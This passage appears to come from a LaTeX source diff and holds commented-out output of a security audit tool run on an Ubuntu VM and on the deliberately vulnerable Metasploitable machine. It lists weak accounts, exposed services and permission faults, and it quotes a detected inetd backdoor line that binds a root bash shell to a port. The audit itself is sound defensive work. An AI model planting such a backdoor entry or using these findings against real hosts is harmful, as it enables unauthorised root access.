+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `colord' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `pulse' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `user' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `systemd-coredump' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass016w] User systemd-coredump has / as home directory 
+% 	--WARN-- [pass013w] Username `sshd' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass012w] Home directory / exists multiple times (2) in /etc/passwd. 
+% 	--WARN-- [pass012w] Home directory /nonexistent exists multiple times (5) in 
+% 			 /etc/passwd. 
+% 	--WARN-- [pass012w] Home directory /run/systemd exists multiple times (3) in 
+% 			 /etc/passwd. 
+	
+% 	# Performing check of group files...
+	
+% 	# Performing check of user accounts...
+% 	# Checking accounts from /etc/passwd.
+% 	--WARN-- [acc021w] Login ID avahi-autoipd appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID dnsmasq appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID lightdm appears to be a dormant account. 
+% 	--WARN-- [acc006w] Login ID mail's home directory (/var/mail) has group `4096' 
+% 			 write access. 
+% 	--WARN-- [acc022w] Login ID nobody home directory (/nonexistent) is not 
+% 			 accessible. 
+% 	--WARN-- [acc021w] Login ID tss appears to be a dormant account. 
+	
+% 	# Performing check of /etc/hosts.equiv and .rhosts files...
+	
+% 	# Checking accounts from /etc/passwd...
+	
+% 	# Performing check of .netrc files...
+	
+% 	# Checking accounts from /etc/passwd...
+	
+% 	# Performing common access checks for root (in /etc/default/login, /securetty, and /etc/ttytab...
+	
+% 	# Performing check of PATH components...
+% 	--WARN-- [path009w] /etc/profile does not export an initial setting for PATH. 
+% 	# Only checking user 'root'
+% 	--WARN-- [path002w] /bin/bsd-write in root's PATH from default is not owned by 
+% 			 root (owned by tty). 
+% 	--WARN-- [path002w] /bin/chage in root's PATH from default is not owned by 
+% 			 root (owned by shadow). 
+% 	--WARN-- [path002w] /bin/crontab in root's PATH from default is not owned by 
+% 			 root (owned by crontab). 
+% 	--WARN-- [path002w] /bin/expiry in root's PATH from default is not owned by 
+% 			 root (owned by shadow). 
+% 	--WARN-- [path002w] /bin/locate in root's PATH from default is not owned by 
+% 			 root (owned by mlocate). 
+% 	--WARN-- [path002w] /bin/mlocate in root's PATH from default is not owned by 
+% 			 root (owned by mlocate). 
+% 	--WARN-- [path002w] /bin/ssh-agent in root's PATH from default is not owned by 
+% 			 root (owned by ssh). 
+% 	--WARN-- [path002w] /bin/wall in root's PATH from default is not owned by root 
+% 			 (owned by tty). 
+% 	--WARN-- [path002w] /bin/write in root's PATH from default is not owned by 
+% 			 root (owned by tty). 
+% 	--WARN-- [path002w] /usr/bin/bsd-write in root's PATH from default is not 
+% 			 owned by root (owned by tty). 
+% 	--WARN-- [path002w] /usr/bin/chage in root's PATH from default is not owned by 
+% 			 root (owned by shadow). 
+% 	--WARN-- [path002w] /usr/bin/crontab in root's PATH from default is not owned 
+% 			 by root (owned by crontab). 
+% 	--WARN-- [path002w] /usr/bin/expiry in root's PATH from default is not owned 
+% 			 by root (owned by shadow). 
+% 	--WARN-- [path002w] /usr/bin/locate in root's PATH from default is not owned 
+% 			 by root (owned by mlocate). 
+% 	--WARN-- [path002w] /usr/bin/mlocate in root's PATH from default is not owned 
+% 			 by root (owned by mlocate). 
+% 	--WARN-- [path002w] /usr/bin/ssh-agent in root's PATH from default is not 
+% 			 owned by root (owned by ssh). 
+% 	--WARN-- [path002w] /usr/bin/wall in root's PATH from default is not owned by 
+% 			 root (owned by tty). 
+% 	--WARN-- [path002w] /usr/bin/write in root's PATH from default is not owned by 
+% 			 root (owned by tty). 
+% 	--WARN-- [path002w] /usr/sbin/pam_extrausers_chkpwd in root's PATH from 
+% 			 default is not owned by root (owned by shadow). 
+% 	--WARN-- [path002w] /usr/sbin/unix_chkpwd in root's PATH from default is not 
+% 			 owned by root (owned by shadow). 
+	
+% 	# Performing check of anonymous FTP...
+	
+% 	# Performing checks of mail aliases...
+	
+% 	# Performing check of `cron' entries...
+% 	--WARN-- [cron004w] Root crontab does not exist 
+% 	--WARN-- [cron005w] Use of cron is not restricted 
+	
+% 	# Performing check of 'services' ...
+% 	# Checking services from /etc/services.
+% 	--WARN-- [inet003w] The port for service x400-snd is also assigned to service 
+% 			 acr-nema. 
+	
+% 	# Performing NFS exports check...
+	
+% 	# Performing check of system file permissions...
+% 	--ERROR-- [init004e] `./systems/default/gen_mounts' is not executable (command GET_MOUNTS).
+	
+% 	# Checking for known intrusion signs...
+% 	--ERROR-- [init004e] `./systems/default/gen_mounts' is not executable (command GET_MOUNTS).
+% 	--ERROR-- [init001e] Don't have required command STRINGS.
+% 	--ERROR-- [misc025e] The ./scripts/check_rootkit will not be run since it is not executable
+	
+% 	# Performing system specific checks...
+	
+% 	# Performing check of root directory...
+	
+% 	# Checking device permissions...
+% 	--FAIL-- [dev002f] /dev/autofs has world permissions 
+% 	--WARN-- [dev003w] The directory /dev/block resides in a device directory. 
+% 	--WARN-- [dev003w] The directory /dev/char resides in a device directory. 
+% 	--WARN-- [dev003w] The directory /dev/cpu resides in a device directory. 
+% 	--FAIL-- [dev002f] /dev/fuse has world permissions 
+% 	--WARN-- [dev003w] The directory /dev/hugepages resides in a device directory. 
+% 	--FAIL-- [dev002f] /dev/kmsg has world permissions 
+% 	--WARN-- [dev003w] The directory /dev/lightnvm resides in a device directory. 
+% 	--WARN-- [dev003w] The directory /dev/mqueue resides in a device directory. 
+% 	--FAIL-- [dev002f] /dev/ptmx has world permissions 
+% 	--FAIL-- [dev002f] /dev/rfkill has world permissions 
+% 	--FAIL-- [dev002f] /dev/vboxuser has world permissions 
+% 	--WARN-- [dev003w] The directory /dev/vfio resides in a device directory. 
+	
+% 	# Checking for existence of log files...
+% 	--FAIL-- [logf005f] Log file /var/log/wtmp permission should be 644 
+% 	--FAIL-- [logf005f] Log file /var/log/btmp permission should be 600 
+% 	--FAIL-- [logf005f] Log file /var/run/utmp permission should be 644 
+% 	--FAIL-- [logf007f] Log file /var/log/messages does not exist 
+	
+% 	# Checking for correct umask settings...
+% 	--WARN-- [misc021w] There are no umask entries in /etc/profile 
+	
+% 	# Checking listening processes 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket 541881 (IPv6 
+% 			 on 541881 interface) is run by 588. 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket raw6 (root 
+% 			 on raw6 interface) is run by 588. 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket 541881 (IPv6 
+% 			 on 541881 interface) is run by 606. 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket raw6 (root 
+% 			 on raw6 interface) is run by 606. 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket UDP (0t0 on 
+% 			 UDP interface) is run by root. 
+% 	--WARN-- [lin003w] The process `NetworkMa' is listening on socket 20650 (raw6 
+% 			 on 20650 interface) is run by root. 
+% 	--WARN-- [lin003w] The process `avahi-dae' is listening on socket UDP (0t0 on 
+% 			 UDP interface) is run by avahi. 
+% 	--WARN-- [lin003w] The process `cups-brow' is listening on socket 80984 (IPv4 
+% 			 on 80984 interface) is run by 6089. 
+% 	--WARN-- [lin003w] The process `cups-brow' is listening on socket 80984 (IPv4 
+% 			 on 80984 interface) is run by 6090. 
+% 	--WARN-- [lin003w] The process `cups-brow' is listening on socket UDP (0t0 on 
+% 			 UDP interface) is run by root. 
+% 	--WARN-- [lin003w] The process `cupsd' is listening on socket TCP (0t0 on TCP 
+% 			 interface) is run by root. 
+% 	--WARN-- [lin003w] The process `fwupd' is listening on socket REG (root on REG 
+% 			 interface) is run by 152282. 
+% 	--WARN-- [lin003w] The process `fwupd' is listening on socket REG (root on REG 
+% 			 interface) is run by 152284. 
+% 	--WARN-- [lin003w] The process `fwupd' is listening on socket REG (root on REG 
+% 			 interface) is run by 152285. 
+% 	--WARN-- [lin003w] The process `fwupd' is listening on socket REG (root on REG 
+% 			 interface) is run by 152286. 
+% 	--WARN-- [lin003w] The process `fwupd' is listening on socket 30864 (REG on 
+% 			 30864 interface) is run by root. 
+% 	--WARN-- [lin003w] The process `sshd' is listening on socket TCP (0t0 on TCP 
+% 			 interface) is run by root. 
+% 	--WARN-- [lin003w] The process `systemd-r' is listening on socket TCP (0t0 on 
+% 			 TCP interface) is run by systemd-resolve. 
+% 	--WARN-- [lin003w] The process `systemd-r' is listening on socket UDP (0t0 on 
+% 			 UDP interface) is run by systemd-resolve. 
+	
+% 	# Checking sshd_config configuration files...
+% 	--WARN-- [ssh004w] The PasswordAuthentication directive in 
+% 			 /etc/ssh/sshd_config is set to the unapproved defult value: yes. 
+	
+% 	# Performing common access checks for root...
+% 	--FAIL-- [netw020f] There is no /etc/ftpusers file. 
+% 	--ERROR-- [misc025e] The ./scripts/check_ntp will not be run since it is not executable
+% 	--ERROR-- [init004e] `./systems/default/getdisks' is not executable (command GETDISKS).
+	
+% 	# Performing check of embedded pathnames...
+% 	--ERROR-- [init001e] Don't have required command STRINGS.
+% 	21:13> Security report completed for user-VirtualBox.
+	
+% \end{minted}
+
+% \begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{tex}
+% 	Security scripts *** 3.2.4rc1, 2018.02.10.20.30 ***
+% 	Sat Aug  1 05:46:44 EDT 2020
+% 	05:46> Beginning security report for metasploitable.localdomain (i686 Linux 2.6.24-16-server).
+	
+% 	# Performing check of passwd files...
+% 	# Checking entries from /etc/passwd.
+% 	--WARN-- [pass014w] Login (backup) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (bin) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (daemon) is disabled, but has a valid shell. 
+% 	--WARN-- [pass016w] User distccd has / as home directory 
+% 	--WARN-- [pass014w] Login (games) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (gnats) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (irc) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (libuuid) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (list) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (lp) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (mail) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (man) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (news) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (nobody) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (proxy) is disabled, but has a valid shell. 
+% 	--WARN-- [pass015w] Login ID sync does not have a valid shell (/bin/sync). 
+% 	--WARN-- [pass014w] Login (uucp) is disabled, but has a valid shell. 
+% 	--WARN-- [pass014w] Login (www-data) is disabled, but has a valid shell. 
+% 	--WARN-- [pass012w] Home directory /nonexistent exists multiple times (3) in 
+% 			 /etc/passwd. 
+% 	--WARN-- [pass006w] Integrity of password files questionable (/usr/sbin/pwck 
+% 			 -r). 
+	
+% 	# Performing check of group files...
+	
+% 	# Performing check of user accounts...
+% 	# Checking accounts from /etc/passwd.
+% 	--WARN-- [acc021w] Login ID backup appears to be a dormant account. 
+% 	--WARN-- [acc006w] Login ID bind's home directory (/var/cache/bind) has group 
+% 			 `bind' write access. 
+% 	--WARN-- [acc021w] Login ID bind appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID ftp appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID libuuid appears to be a dormant account. 
+% 	--WARN-- [acc006w] Login ID mail's home directory (/var/mail) has group `mail' 
+% 			 write access. 
+% 	--WARN-- [acc019w] Login ID msfadmin may be missing a shell initialization 
+% 			 file /home/msfadmin/.bashrc. 
+% 	--WARN-- [acc022w] Login ID nobody home directory (/nonexistent) is not 
+% 			 accessible. 
+% 	--WARN-- [acc021w] Login ID service appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID tomcat55 appears to be a dormant account. 
+% 	--WARN-- [acc021w] Login ID user appears to be a dormant account. 
+	
+% 	# Performing check of /etc/hosts.equiv and .rhosts files...
+% 	--FAIL-- [rcmd009f] /etc/hosts.equiv contains '+'. 
+	
+% 	# Checking accounts from /etc/passwd...
+% 	--FAIL-- [rcmd002f] User msfadmin's .rhosts file has a '+' for host field. 
+% 	--WARN-- [rcmd003w] User msfadmin's .rhosts file provides access for user `+' 
+% 			 at host `+'. 
+% 	--FAIL-- [rcmd002f] User root's .rhosts file has a '+' for host field. 
+% 	--WARN-- [rcmd003w] User root's .rhosts file provides access for user `+' at 
+% 			 host `+'. 
+% 	--WARN-- [rcmd016w] User msfadmin has a .rhosts file 
+% 	--ALERT-- [rcmd017a] Root has a .rhosts file 
+	
+% 	# Performing check of .netrc files...
+	
+% 	# Checking accounts from /etc/passwd...
+	
+% 	# Performing common access checks for root (in /etc/default/login, /securetty, and /etc/ttytab...
+% 	--WARN-- [root001w] Remote root login allowed in /etc/ssh/sshd_config 
+	
+% 	# Performing check of PATH components...
+% 	--WARN-- [path009w] /etc/profile does not export an initial setting for PATH. 
+% 	# Only checking user 'root'
+	
+% 	# Performing check of anonymous FTP...
+	
+% 	# Performing checks of mail aliases...
+% 	# Checking aliases from /etc/aliases.
+	
+% 	# Performing check of `cron' entries...
+% 	--WARN-- [cron004w] Root crontab does not exist 
+% 	--WARN-- [cron005w] Use of cron is not restricted 
+	
+% 	# Performing check of 'inetd'...
+% 	# Checking inetd entries from /etc/inetd.conf
+% 	--FAIL-- [inet006f] 'exec' service is enabled, consider disabling it. 
+% 	--WARN-- [inet099w] 'ingreslock' is not protected by tcp wrappers. 
+% 	--WARN-- [inet098w] The 'login' server is enabled, consider using ssh/sftp 
+% 			 instead. 
+% 	--WARN-- [inet098w] The 'rsh' server is enabled, consider using ssh/sftp 
+% 			 instead. 
+% 	--WARN-- [inet098w] The 'telnet' server is enabled, consider using ssh 
+% 			 instead. 
+% 	--WARN-- [inet022w] The 'tftpd' server is enabled, consider disabling it 
+	
+% 	# Performing check of services with tcp wrappers...
+% 	# Analysing inetd entries from /etc/inetd.conf
+	
+% 	# Performing check of 'xinetd' related services...
+% 	--WARN-- [inet017w] /etc/xinetd.conf permissions are not 600. 
+% 	--WARN-- [inet100w] xinetd is not configured with logging enabled. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/chargen permissions are not 600. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/daytime permissions are not 600. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/discard permissions are not 600. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/echo permissions are not 600. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/time permissions are not 600. 
+% 	--WARN-- [inet017w] /etc/xinetd.d/vsftpd permissions are not 600. 
+% 	--WARN-- [inet098w] The 'ftp' server is enabled, consider using ssh/sftp 
+% 			 instead. 
+	
+% 	# Performing check of 'services' ...
+% 	# Checking services from /etc/services.
+% 	--WARN-- [inet003w] The port for service http is also assigned to service www. 
+% 	--WARN-- [inet003w] The port for service http is also assigned to service www. 
+% 	--WARN-- [inet003w] The port for service gds-db is also assigned to service 
+% 			 gds_db. 
+% 	--WARN-- [inet003w] The port for service gds-db is also assigned to service 
+% 			 gds_db. 
+% 	--WARN-- [inet003w] The port for service kerberos-master is also assigned to 
+% 			 service kerberos_master. 
+% 	--WARN-- [inet003w] The port for service kerberos-master is also assigned to 
+% 			 service kerberos_master. 
+% 	--WARN-- [inet003w] The port for service passwd-server is also assigned to 
+% 			 service passwd_server. 
+% 	--WARN-- [inet003w] The port for service krb-prop is also assigned to service 
+% 			 krb_prop. 
+% 	--WARN-- [inet003w] The port for service moira-db is also assigned to service 
+% 			 moira_db. 
+% 	--WARN-- [inet003w] The port for service moira-update is also assigned to 
+% 			 service moira_update. 
+% 	--WARN-- [inet003w] The port for service moira-ureg is also assigned to 
+% 			 service moira_ureg. 
+% 	--WARN-- [inet003w] The port for service cisco-sccp is also assigned to 
+% 			 service sieve. 
+% 	--WARN-- [inet003w] The port for service pipe-server is also assigned to 
+% 			 service ndtp. 
+% 	--WARN-- [inet003w] The port for service http-alt is also assigned to service 
+% 			 webcache. 
+	
+% 	# Performing NFS exports check...
+% 	--WARN-- [nfs003w] Exporting the root filesystem (/). 
+	
+% 	# Performing check of system file permissions...
+% 	--ALERT-- [perm023a] /bin/su is setuid to `root'. 
+% 	--WARN-- [perm006w] The owner of /root/.rhosts should be jfernand (owned by 
+% 			 root). 
+% 	--WARN-- [perm001w] /root/.rhosts should not have owner execute. 
+% 	--ALERT-- [perm023a] /usr/bin/at is setuid to `daemon'. 
+% 	--ALERT-- [perm024a] /usr/bin/at is setgid to `daemon'. 
+% 	--WARN-- [perm001w] The owner of /usr/bin/at should be root (owned by daemon). 
+% 	--WARN-- [perm002w] The group owner of /usr/bin/at should be root. 
+% 	--ALERT-- [perm023a] /usr/bin/passwd is setuid to `root'. 
+% 	--ALERT-- [perm024a] /usr/bin/wall is setgid to `tty'. 
+% 	--WARN-- [perm002w] The group owner of /var/log/wtmp should be utmp. 
+	
+% 	# Checking for known intrusion signs...
+% 	# Testing for promiscuous interfaces with /bin/ip
+% 	# Testing for backdoors in inetd.conf
+% 	--ALERT-- [kis014a] There is a shell defined in inetd.conf, the backdoor line 
+% 			  is: 'ingreslock stream tcp nowait root /bin/bash bash -i' 
+	
+% 	# Performing check of files in system mail spool...
+% 	--ERROR-- [misc025e] The ./scripts/check_rootkit will not be run since it is not executable
+	
+% 	# Performing system specific checks...
+% 	# Performing checks for Linux/2...
+	
+% 	# Checking for single user-mode password...
+	
+% 	# Checking boot loader file permissions...
+% 	--WARN-- [boot06] The Grub bootloader configuation file (/boot/grub/menu.lst) 
+% 			 does not have a password configured. 
+	
+% 	# Checking for vulnerabilities in inittab configuration...
+	
+% 	# Checking for correct umask settings for init scripts...
+% 	--WARN-- [misc021w] There are no umask entries in /etc/init.d/rcS 
+	
+% 	# Checking Logins not used on the system ...
+	
+% 	# Checking network configuration
+% 	--WARN-- [lin012w] The system accepts ICMP redirection messages 
+% 	--FAIL-- [lin013f] The system is not protected against Syn flooding attacks 
+% 	--FAIL-- [lin016f] The system permits source routing from incoming packets 
+% 	--WARN-- [lin017w] The system is not configured to log suspicious (martian) 
+% 			 packets 
+% 	--FAIL-- [lin019f] The system does not have any local firewall rules 
+% 			 configured 
+	
+% 	# Verifying system specific password checks...
+	
+% 	# Checking OS release...
+% 	--FAIL-- [osv002f] Out of date Ubuntu Linux version `8.04' 
+	
+% 	# Checking md5sums of installed files
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.pcimap' checksum differs from 
+% 			 installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file `/lib/modules/2.6.24-16-server/modules.dep' 
+% 			 checksum differs from installed package 
+% 			 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.ieee1394map' checksum differs 
+% 			 from installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.usbmap' checksum differs from 
+% 			 installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.isapnpmap' checksum differs 
+% 			 from installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.seriomap' checksum differs 
+% 			 from installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.alias' checksum differs from 
+% 			 installed package 'linux-image-2.6.24-16-server'. 
+% 	--FAIL-- [lin005f] Installed file 
+% 			 `/lib/modules/2.6.24-16-server/modules.symbols' checksum differs from 
+% 			 installed package 'linux-image-2.6.24-16-server'. 
+	
+% 	# Checking installed files against packages...
+% 	--WARN-- [lin001w] File `/usr/sbin/druby_timeserver.rb' does not belong to any 
+% 			 package. 
+% 	--WARN-- [lin001w] File `/usr/sbin/vsftpd' does not belong to any package. 
+% 	--WARN-- [lin001w] File `/usr/bin/unrealircd' does not belong to any package. 
+	
+% 	# Performing check of root directory...
+	
+% 	# Checking device permissions...
+% 	--FAIL-- [dev002f] /dev/log has world permissions 
+% 	--WARN-- [dev003w] The directory /dev/metasploitable resides in a device 
+% 			 directory. 
+% 	--FAIL-- [dev002f] /dev/ptmx has world permissions 
+	
+% 	# Checking for existence of log files...
+% 	--FAIL-- [logf005f] Log file /var/log/btmp permission should be 600 
+% 	--FAIL-- [logf005f] Log file /var/log/messages permission should be 640 
+% 	--ERROR-- [misc025e] The ./systems/Linux/2/check_umask will not be run since it is not executable
+	
+% 	# Checking listening processes 
+% 	--WARN-- [lin002i] The process `Xtightvnc' is listening on socket 5900 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `Xtightvnc' is listening on socket 6000 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `apache2' is listening on socket 80 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin003w] The process `apache2' is listening on socket 80 (TCP on 
+% 			 every interface) is run by www-data. 
+% 	--WARN-- [lin003w] The process `dhclient3' is listening on socket 68 (UDP on 
+% 			 every interface) is run by dhcp. 
+% 	--WARN-- [lin003w] The process `jsvc' is listening on socket 8009 (TCP on 
+% 			 every interface) is run by tomcat55. 
+% 	--WARN-- [lin003w] The process `jsvc' is listening on socket 8180 (TCP on 
+% 			 every interface) is run by tomcat55. 
+% 	--WARN-- [lin002i] The process `master' is listening on socket 25 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin003w] The process `mysqld' is listening on socket 3306 (TCP on 
+% 			 every interface) is run by mysql. 
+% 	--WARN-- [lin003w] The process `named' is listening on socket 53 (TCP on 
+% 			 192.168.0.184 interface) is run by bind. 
+% 	--WARN-- [lin003w] The process `named' is listening on socket 33513 (UDP on 
+% 			 every interface) is run by bind. 
+% 	--WARN-- [lin003w] The process `named' is listening on socket 53 (UDP on 
+% 			 192.168.0.184 interface) is run by bind. 
+% 	--WARN-- [lin002i] The process `nmbd' is listening on socket 137 (UDP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `nmbd' is listening on socket 138 (UDP) on 
+% 			 every interface. 
+% 	--WARN-- [lin003w] The process `portmap' is listening on socket 111 (TCP on 
+% 			 every interface) is run by daemon. 
+% 	--WARN-- [lin003w] The process `portmap' is listening on socket 111 (UDP on 
+% 			 every interface) is run by daemon. 
+% 	--WARN-- [lin003w] The process `postgres' is listening on socket 5432 (TCP on 
+% 			 every interface) is run by postgres. 
+% 	--WARN-- [lin002i] The process `rmiregistry' is listening on socket 1099 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `rmiregistry' is listening on socket 38125 
+% 			 (TCP) on every interface. 
+% 	--WARN-- [lin002i] The process `rpc.mountd' is listening on socket 60267 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `rpc.mountd' is listening on socket 52464 (UDP) 
+% 			 on every interface. 
+% 	--WARN-- [lin003w] The process `rpc.statd' is listening on socket 40286 (TCP 
+% 			 on every interface) is run by statd. 
+% 	--WARN-- [lin003w] The process `rpc.statd' is listening on socket 56796 (UDP 
+% 			 on every interface) is run by statd. 
+% 	--WARN-- [lin003w] The process `rpc.statd' is listening on socket 869 (UDP on 
+% 			 every interface) is run by statd. 
+% 	--WARN-- [lin002i] The process `ruby' is listening on socket 8787 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `smbd' is listening on socket 139 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `smbd' is listening on socket 445 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `sshd' is listening on socket 22 (TCP) on every 
+% 			 interface. 
+% 	--WARN-- [lin002i] The process `unrealircd' is listening on socket 6667 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `unrealircd' is listening on socket 6697 (TCP) 
+% 			 on every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 1524 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 21 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 23 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 512 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 513 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 514 (TCP) on 
+% 			 every interface. 
+% 	--WARN-- [lin002i] The process `xinetd' is listening on socket 69 (UDP) on 
+% 			 every interface. 
+	
+% 	# Checking sshd_config configuration files...
+% 	--WARN-- [ssh004w] The PasswordAuthentication directive in 
+% 			 /etc/ssh/sshd_config is set to the unapproved value: yes. 
+	
+% 	# Checking printer configuration files...
+	
+% 	# Performing common access checks for root...
+% 	--FAIL-- [netw018f] Administrative user backup allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user bind allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user dhcp allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user distccd allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user ftp allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user gnats allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user irc allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user klog allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user libuuid allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user list allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user mysql allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user postfix allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user postgres allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user proftpd allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user proxy allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user sshd allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user statd allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user syslog allowed access in /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user telnetd allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user tomcat55 allowed access in 
+% 			 /etc/ftpusers 
+% 	--FAIL-- [netw018f] Administrative user www-data allowed access in 
+% 			 /etc/ftpusers 
+% 	--ERROR-- [misc025e] The ./scripts/check_ntp will not be run since it is not executable
+% 	--WARN-- [fsys013w] cannot access /usr/share/man/man1/vncpasswd.1.gz is a 
+% 			 dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ca/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/rw/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/zh_CN/LC_TIME/coreutils.mo 
+% 			 is a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/da/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/et/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/fi/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ko/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/be/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/pt_BR/LC_TIME/coreutils.mo 
+% 			 is a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/hu/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/de/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/pt/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/af/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/tr/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ru/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/cs/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/pl/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ja/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/es/LC_TIME/coreutils.mo is 
